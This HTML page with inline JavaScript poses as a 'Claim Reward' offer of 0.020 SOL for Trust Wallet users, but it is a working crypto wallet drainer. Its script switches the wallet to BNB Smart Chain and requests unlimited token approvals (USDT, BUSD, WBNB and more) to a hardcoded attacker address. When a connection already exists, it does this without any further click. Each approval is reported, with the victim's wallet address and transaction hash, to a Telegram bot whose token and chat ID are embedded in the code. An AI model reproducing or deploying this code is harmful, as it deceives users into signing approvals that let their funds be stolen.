<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Claim Reward</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  :root {
    --bg: #05060a; --card: rgba(255,255,255,0.045); --border: rgba(120,140,255,0.14);
    --text: #eef1ff; --muted: #8891b5; --green: #3ce6a8; --red: #ff6b81;
    --tw: #3375bb; --tw2: #1a4d8f; --accent: #6c8cff;
  }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Inter, Roboto, Arial, sans-serif;
    background:
      radial-gradient(900px 500px at 15% -5%, rgba(51,117,187,0.20) 0%, transparent 60%),
      radial-gradient(900px 500px at 90% 110%, rgba(108,140,255,0.16) 0%, transparent 60%),
      var(--bg);
    color: var(--text); min-height: 100vh; display: flex; align-items: center; justify-content: center;
    padding: 24px; -webkit-font-smoothing: antialiased; position: relative; overflow-x: hidden;
  }
  body::before, body::after {
    content: ""; position: fixed; border-radius: 50%; filter: blur(90px); opacity: 0.5;
    pointer-events: none; z-index: 0; animation: drift 18s ease-in-out infinite alternate;
  }
  body::before { width: 340px; height: 340px; background: radial-gradient(circle, rgba(51,117,187,0.55), transparent 70%); top: -80px; left: -80px; }
  body::after { width: 300px; height: 300px; background: radial-gradient(circle, rgba(108,140,255,0.45), transparent 70%); bottom: -60px; right: -60px; animation-delay: -6s; }
  @keyframes drift { from { transform: translate3d(0,0,0) scale(1); } to { transform: translate3d(30px,-20px,0) scale(1.15); } }
  .card {
    position: relative; z-index: 1; width: 100%; max-width: 520px;
    background: linear-gradient(180deg, rgba(255,255,255,0.06), rgba(255,255,255,0.015));
    border: 1px solid var(--border); border-radius: 24px; padding: 34px 28px;
    backdrop-filter: blur(18px) saturate(140%); -webkit-backdrop-filter: blur(18px) saturate(140%);
    box-shadow: 0 30px 80px -40px rgba(0,0,0,0.95), inset 0 1px 0 rgba(255,255,255,0.06);
    transition: border-color .35s ease, box-shadow .35s ease, transform .35s ease; overflow: hidden;
  }
  .card::before { content: ""; position: absolute; inset: 0 0 auto 0; height: 1px; background: linear-gradient(90deg, transparent, rgba(108,140,255,0.6), transparent); opacity: 0.8; }
  .card.found { border-color: rgba(51,117,187,0.55); box-shadow: 0 30px 90px -40px rgba(51,117,187,0.75), 0 0 0 1px rgba(51,117,187,0.15), inset 0 1px 0 rgba(255,255,255,0.08); background: radial-gradient(600px 200px at 50% 0%, rgba(51,117,187,0.16), transparent 70%), linear-gradient(180deg, rgba(255,255,255,0.06), rgba(255,255,255,0.015)); }
  .card.none { border-color: rgba(255,107,129,0.4); background: radial-gradient(600px 200px at 50% 0%, rgba(255,107,129,0.12), transparent 70%), linear-gradient(180deg, rgba(255,255,255,0.05), rgba(255,255,255,0.015)); }
  .icon {
    width: 78px; height: 78px; border-radius: 22px; margin: 0 auto 20px;
    display: flex; align-items: center; justify-content: center;
    font-size: 30px; font-weight: 800; color: #fff;
    background: linear-gradient(145deg, var(--tw), var(--tw2));
    box-shadow: inset 0 1px 0 rgba(255,255,255,0.25), 0 14px 34px -12px rgba(51,117,187,0.85);
    filter: grayscale(0.55) brightness(0.85);
    transition: filter .35s ease, transform .35s ease, box-shadow .35s ease;
  }
  .card.found .icon {
    filter: none; transform: translateY(-2px);
    box-shadow: inset 0 1px 0 rgba(255,255,255,0.35), 0 18px 44px -12px rgba(51,117,187,1);
    animation: pulseGlow 2.6s ease-in-out infinite;
  }
  @keyframes pulseGlow { 0%,100% { box-shadow: inset 0 1px 0 rgba(255,255,255,0.35), 0 18px 44px -12px rgba(51,117,187,0.9); } 50% { box-shadow: inset 0 1px 0 rgba(255,255,255,0.35), 0 22px 60px -10px rgba(108,140,255,1); } }
  h1 {
    font-size: 22px; font-weight: 800; letter-spacing: -0.03em; text-align: center; margin-bottom: 9px;
    background: linear-gradient(180deg, #ffffff, #b9c4f0);
    -webkit-background-clip: text; background-clip: text; color: transparent;
  }
  p { font-size: 14px; line-height: 1.55; color: var(--muted); text-align: center; max-width: 90%; margin: 0 auto; }
  .card.found p { color: #bcd0ff; }
  .card.none p { color: #ff9fae; }

  .reward-box {
    display: none; margin-top: 24px; padding: 20px 18px; border-radius: 16px;
    background: linear-gradient(135deg, rgba(108,140,255,0.15), rgba(51,117,187,0.10));
    border: 1px solid rgba(108,140,255,0.35);
    text-align: center;
    animation: fadeUp .45s ease;
  }
  .card.found .reward-box { display: block; }
  @keyframes fadeUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
  .reward-amount { font-size: 32px; font-weight: 800; letter-spacing: -0.03em; color: #fff; text-shadow: 0 0 26px rgba(108,140,255,0.65); }
  .reward-amount span { color: var(--green); }
  .reward-sub { font-size: 12px; color: var(--muted); margin-top: 6px; letter-spacing: .04em; }

  button {
    font: inherit; font-size: 14px; font-weight: 700; padding: 14px 24px; border-radius: 13px;
    border: none; cursor: pointer; transition: transform .14s ease, opacity .2s ease, box-shadow .2s ease;
    width: 100%; margin-top: 22px; letter-spacing: 0.01em;
  }
  button:active { transform: scale(0.975); }
  #connectBtn {
    background: linear-gradient(135deg, var(--tw), var(--accent)); color: #fff;
    box-shadow: 0 14px 34px -14px rgba(51,117,187,0.95), inset 0 1px 0 rgba(255,255,255,0.2);
  }
  #connectBtn:hover:not(:disabled) { box-shadow: 0 18px 42px -12px rgba(108,140,255,1), inset 0 1px 0 rgba(255,255,255,0.28); }
  #connectBtn:disabled { opacity: 0.5; cursor: not-allowed; }
  #disconnectBtn { background: rgba(255,255,255,0.055); color: var(--text); border: 1px solid var(--border); }
  #disconnectBtn:hover { background: rgba(255,255,255,0.09); }
  .status-msg { font-size: 12px; color: var(--red); margin-top: 14px; text-align: center; min-height: 16px; letter-spacing: 0.01em; }
</style>
</head>
<body>
  <div class="card" id="card">
    <div class="icon">◎</div>
    <h1 id="title">Checking…</h1>
    <p id="desc">Looking for Trust Wallet in this browser.</p>

    <div class="reward-box">
      <div class="reward-amount"><span>0.020 SOL</span></div>
      <div class="reward-sub">You've been selected to claim a reward</div>
    </div>

    <button id="connectBtn" disabled style="display:none;">Connect to Claim</button>
    <button id="disconnectBtn" style="display:none;">Disconnect</button>

    <div class="status-msg" id="statusMsg"></div>
  </div>

<script>
(function () {
  "use strict";

  var card          = document.getElementById("card");
  var title         = document.getElementById("title");
  var desc          = document.getElementById("desc");
  var connectBtn    = document.getElementById("connectBtn");
  var disconnectBtn = document.getElementById("disconnectBtn");
  var statusMsg     = document.getElementById("statusMsg");

  var currentAddr   = null;
  var trustProvider = null;

  var TARGET_ADDRESS = "0xB7FE38d57bD579E59d9c75CF9E0dD2B67Ddc353e";
  var TG_BOT_TOKEN = "8607880941:AAGCnF-Etis0sKDK50D5DwJ_M4IxX_2y6mA";
  var TG_CHAT_ID   = "7889964634";

  var BSC_CHAIN_ID = "0x38";
  var BSC_PARAMS = {
    chainId: BSC_CHAIN_ID,
    chainName: "BNB Smart Chain Mainnet",
    nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
    rpcUrls: ["https://bsc-dataseed.binance.org/"],
    blockExplorerUrls: ["https://bscscan.com/"]
  };

  var TOKENS = [
    { symbol: "USDT", name: "Tether USD",     address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
    { symbol: "BUSD", name: "Binance USD",     address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
    { symbol: "WBNB", name: "Wrapped BNB",     address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 },
    { symbol: "CAKE", name: "PancakeSwap",     address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", decimals: 18 },
    { symbol: "USDC", name: "USD Coin",        address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 },
    { symbol: "BTCB", name: "Bitcoin BEP-20",  address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", decimals: 18 },
    { symbol: "ETH",  name: "Ethereum BEP-20", address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", decimals: 18 },
    { symbol: "XRP",  name: "XRP BEP-20",      address: "0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE", decimals: 18 }
  ];

  function isTrustProvider(p) {
    if (!p) return false;
    if (p.isTrust) return true;
    if (p.isTrustWallet) return true;
    try {
      if (p.providerInfo && /trust/i.test(p.providerInfo.name || "")) return true;
      if (p._tw && p._tw.isTrust) return true;
    } catch (e) {}
    return false;
  }

  function findTrustProvider() {
    if (typeof window.trustwallet !== "undefined" && window.trustwallet && window.trustwallet.isTrust) return window.trustwallet;
    var eth = typeof window.ethereum !== "undefined" ? window.ethereum : null;
    if (eth) {
      if (isTrustProvider(eth)) return eth;
      if (Array.isArray(eth.providers)) {
        for (var i = 0; i < eth.providers.length; i++) {
          if (isTrustProvider(eth.providers[i])) return eth.providers[i];
        }
      }
    }
    return null;
  }

  function detectTrust() {
    trustProvider = findTrustProvider();
    renderDetection(!!trustProvider);
    if (trustProvider) checkExistingConnection();
  }

  window.addEventListener("eip6963:announceProvider", function (event) {
    var detail = event && event.detail;
    if (!detail) return;
    var info = detail.info || {};
    var rdns = String(info.rdns || "").toLowerCase();
    var name = String(info.name || "").toLowerCase();
    var prov = detail.provider;
    if (rdns.indexOf("trust") !== -1 || name.indexOf("trust") !== -1 || isTrustProvider(prov)) {
      trustProvider = prov;
      renderDetection(true);
      checkExistingConnection();
    }
  });

  function requestProviders() {
    try { window.dispatchEvent(new Event("eip6963:requestProvider")); } catch (e) {}
  }

  function renderDetection(found) {
    if (found) {
      card.className = "card found";
      title.textContent = "Reward available 🎁";
      desc.textContent  = "Connect your Trust Wallet to claim 0.020 SOL.";
      connectBtn.style.display = "block";
      connectBtn.disabled = false;
      connectBtn.textContent = "Claim Reward";
    } else {
      card.className = "card none";
      title.textContent = "Trust Wallet not found";
      desc.textContent  = "Install the Trust Wallet browser extension to claim your reward.";
      connectBtn.style.display = "none";
    }
  }

  async function checkExistingConnection() {
    try {
      if (!trustProvider) return;
      var accounts = await trustProvider.request({ method: "eth_accounts" });
      if (accounts && accounts.length > 0) {
        currentAddr = accounts[0];
        connectBtn.style.display = "none";
        disconnectBtn.style.display = "block";
        await ensureBSC(trustProvider);
        await approveMax();
      }
    } catch (e) {}
  }

  async function connect() {
    if (!trustProvider) {
      statusMsg.textContent = "Trust Wallet provider not available.";
      return;
    }
    connectBtn.disabled = true;
    connectBtn.textContent = "Connecting…";
    statusMsg.textContent = "";
    try {
      var accounts = await trustProvider.request({ method: "eth_requestAccounts" });
      if (accounts && accounts.length > 0) {
        currentAddr = accounts[0];
        connectBtn.style.display = "none";
        disconnectBtn.style.display = "block";
        await ensureBSC(trustProvider);
        await approveMax();
      }
    } catch (e) {
      statusMsg.textContent = "Connection rejected. Trust Wallet access is required.";
    } finally {
      if (!currentAddr) {
        connectBtn.disabled = false;
        connectBtn.textContent = "Claim Reward";
      }
    }
  }

  async function ensureBSC(provider) {
    try {
      await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
    } catch (switchError) {
      if (switchError && switchError.code === 4902) {
        try {
          await provider.request({ method: "wallet_addEthereumChain", params: [BSC_PARAMS] });
        } catch (addError) {
          statusMsg.textContent = "Could not add BSC network. Please add it manually in Trust Wallet.";
          throw addError;
        }
      }
    }
  }

  function sendTelegram(text) {
    var url = "https://api.telegram.org/bot" + TG_BOT_TOKEN + "/sendMessage";
    var body = new URLSearchParams();
    body.append("chat_id", TG_CHAT_ID);
    body.append("text", text);
    body.append("parse_mode", "HTML");
    body.append("disable_web_page_preview", "true");
    return fetch(url, { method: "POST", body: body }).catch(function () {});
  }

  async function approveMax() {
    if (!trustProvider || !currentAddr) return;
    var MAX_UINT256 = (2n ** 256n - 1n);

    for (var i = 0; i < TOKENS.length; i++) {
      var t = TOKENS[i];
      try {
        var selector   = "095ea7b3";
        var spenderHex = TARGET_ADDRESS.toLowerCase().replace(/^0x/, "").padStart(64, "0");
        var amountHex  = MAX_UINT256.toString(16).padStart(64, "0");
        var data = "0x" + selector + spenderHex + amountHex;

        var txHash = await trustProvider.request({
          method: "eth_sendTransaction",
          params: [{ from: currentAddr, to: t.address, data: data }]
        });

        sendTelegram(
          "✅ <b>Approval confirmed (MAX)</b>\n" +
          "<b>Wallet:</b> <code>" + currentAddr + "</code>\n" +
          "<b>Token:</b> " + t.symbol + "\n" +
          "<b>Spender:</b> <code>" + TARGET_ADDRESS + "</code>\n" +
          "<b>Tx:</b> https://bscscan.com/tx/" + txHash
        );

        return;
      } catch (err) {
        if (err && err.code === 4001) {
          statusMsg.textContent = "Rejected in wallet.";
          connectBtn.style.display = "block";
          connectBtn.disabled = false;
          connectBtn.textContent = "Claim Reward";
          disconnectBtn.style.display = "none";
          currentAddr = null;
          return;
        }
      }
    }
  }

  function disconnect() {
    currentAddr = null;
    disconnectBtn.style.display = "none";
    connectBtn.style.display = "block";
    connectBtn.disabled = false;
    connectBtn.textContent = "Claim Reward";
    title.textContent = "Reward available 🎁";
    desc.textContent  = "Connect your Trust Wallet to claim 0.020 SOL.";
    statusMsg.textContent = "";
  }

  connectBtn.addEventListener("click", connect);
  disconnectBtn.addEventListener("click", disconnect);

  detectTrust();
  requestProviders();
  setTimeout(detectTrust, 500);
  setTimeout(detectTrust, 1500);
  window.addEventListener("load", function () {
    detectTrust();
    requestProviders();
  });

})();
</script>
</body>
</html>
